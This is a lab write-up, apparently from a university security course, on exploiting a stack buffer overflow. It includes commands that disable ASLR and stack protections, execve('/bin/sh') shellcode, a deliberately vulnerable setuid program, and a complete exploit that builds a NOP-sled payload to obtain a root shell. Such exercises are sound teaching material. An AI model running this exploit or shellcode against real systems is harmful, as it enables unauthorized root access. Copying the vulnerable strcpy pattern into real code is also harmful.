The virtual machine runs Ubuntu OS 12.04

1. We need to follow the below steps before starting our attack project:
 >> Address Space Randomization: Address space layout randomization (ASLR) is a memory-protection process for operating systems that guards against buffer-overflow attacks 
				by randomizing the location where system executables are loaded into memory.
 We disable these features using the following commands (so that the executable's stack has same address in memory each time it runs):
	$ su root Password: (enter root password) 
	#sysctl -w kernel.randomize_va_space=0

 >>Non-Executable Stack: By Default the stack is set to non-executable, so that an attempt to execute machine code in these regions will cause an exception. 

  Use command 1 to change the executable settings of the stack: (We require a executable stack for our attack: Command1)
		1. For executable stack: $ gcc -z execstack -o test test.c (Use this command to change the stack to executable)
		2. For non-executable stack: $ gcc -z noexecstack -o test test.c

*******************************************************************


2. Shellcode: Shellcode is a code to launch a shell. 
 >> The shellcode we will be using is an assembly version of the below program:

	#include <stdio.h>
	int main( ) 
	{ 
		char *name[2];
		name[0] = ‘‘/bin/sh’’; 
		name[1] = NULL; 
		execve(name[0], name, NULL);
	}

 >>Below is the code for the call.shellcode.c program with shellcode in assembly version

	/* call_shellcode.c */

	#include <stdlib.h> 
	#include <stdio.h> 
	#include <string.h>
	
	const char code[] = 
	"\x31\xc0" 	/* Line 1: xorl %eax,%eax */ 
	"\x50" 		/* Line 2: pushl %eax */ 
	"\x68""//sh" 	/* Line 3: pushl $0x68732f2f */
	"\x68""/bin" 	/* Line 4: pushl $0x6e69622f */ 
	"\x89\xe3" 	/* Line 5: movl %esp,%ebx */ 
	"\x50"		/* Line 6: pushl %eax */ 
	"\x53" 		/* Line 7: pushl %ebx */
	"\x89\xe1"	/* Line 8: movl %esp,%ecx */ 
	"\x99" 		/* Line 9: cdq */ 
	"\xb0\x0b" 	/* Line 10: movb $0x0b,%al */
	"\xcd\x80" 	/* Line 11: int $0x80 */
	;
	
	int main(int argc, char **argv) 
	{ 
		char buf[sizeof(code)]; 
		strcpy(buf, code); 
		((void(*)( ))buf)( ); 
	}

This is a basic program that calls a shellcode when we execute it. 

>>Compile the program using the command: $ gcc -z execstack -o call_shellcode call_shellcode.c
					 and run it: ./call_shellcode.c
  The shellcode launches a new shell but it is not in root form.

>>Our aim is to launch a new shell in root form.

*******************************************************************

3. Vulnerable Program: stack.c

>> This program has a buffer overflow vulnerability. Our task is to exploit this vulnerability to lauch a new shell with root privileges.

>> The Stack Guard Protection Scheme:  The GCC compiler implements a security mechanism called "Stack Guard" to prevent buffer overﬂows. 
 In the presence of this protection, buffer overﬂow will not work.  
 For example, to compile a program example.c with Stack Guard disabled, you may use the following command:

			$ gcc -fno-stack-protector example.c

>> /*stack.c*/	 
	#include <stdlib.h> 
	#include <stdio.h> 
	#include <string.h>

	int bof(char *str) 
	{ 
		char buffer[24];
		strcpy(buffer, str);
		return 1;
	}

	int main(int argc, char **argv) 
	{ 
		char str[517]; 
		FILE *badfile;
		badfile = fopen("badfile", "r"); 
		fread(str, sizeof(char), 517, badfile); 
		bof(str); 
		printf("Returned Properly\n"); 
		return 1;
	}


We can Compile the above vulnerable program and make it set-root-uid. 
We need to compile it and chmod to 4755 (don’t forget to include the execstack and -fno-stack-protector options to turn off the non-executable stack and StackGuard protections):
	$ su root Password (enter root password) 
	# gcc -o stack -z execstack -fno-stack-protector stack.c 
	# chmod 4755 stack	
	# exit


*******************************************************************

4. Exploiting the Vulnerability 

>> We run the exploit code using the file exploit.c which in turn generates contents of the bad file. 
We use the gdb to determine the base pointer address and knowing the position of the Return address relative to the buffer we over write the Return address such that it points to the location in the stack containing NOPs eventually executing the shellcode.

/*exploit.c*/

#include<stdlib.h>
#include<stdio.h>
#include<string.h>

char shellcode[]=
"\x31\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80"
;

void main(int argc, char **argv)
{
char buffer[517];
FILE *badfile;
memset(&buffer, 0x90, 517);

*(buffer+36)=0x32;
*(buffer+37)=0xf2;
*(buffer+38)=0xff;
*(buffer+39)=0xbf;

int end=sizeof(buffer) - sizeof(shellcode);

int i;
for(i=0; i<sizeof(shellcode); i++)
buffer[end+i] = shellcode[i];

badfile=fopen("./badfile","w");
fwrite(buffer, 517, 1, badfile);
fclose(badfile);
}

>>Compile and run the above program, the contents of the bad file are generated then run the stack program. 

	$ gcc -o exploit exploit.c 
	$./exploit // create the badfile 
	$./stack // launch the attack by running the vulnerable program 
	# <----  You’ve got a root shell!

>> When we run the id command 
	#id
	We observe that the uid is not equal to 0, to set the uid to 0, run the below code

	void main() 
	{ 
		setuid(0); 
		system("/bin/sh"); 
	}

	Now run the #id and the uid is changes to 0 which means root uid.






	



 	

	





	  
	